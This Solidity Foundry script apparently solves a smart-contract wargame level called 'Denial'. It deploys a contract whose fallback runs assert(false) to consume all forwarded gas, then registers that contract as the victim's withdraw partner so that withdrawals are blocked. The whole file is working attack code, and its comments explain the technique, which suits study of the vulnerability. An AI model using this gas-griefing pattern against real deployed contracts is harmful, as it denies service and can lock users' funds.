// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialAttackMaliciousContract {
    fallback() external payable {
        // NB: revert() would not work here because the victim contract is
        // interacting with this via .call() which doesn't revert upstream
        // if our function reverts.
        // Instead, we can use assert(false), which as of pre Solidity 0.8.0
        // consumes all gas on assertion failure
        assert(false);
    }
}

contract DenialAttacker is Constants, Script {
    function run() public {
        IDenial victim = IDenial(DENIAL_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }

    function attack(IDenial victim) private {
        DenialAttackMaliciousContract maliciousContract = new DenialAttackMaliciousContract();
        victim.setWithdrawPartner(address(maliciousContract));
    }
}
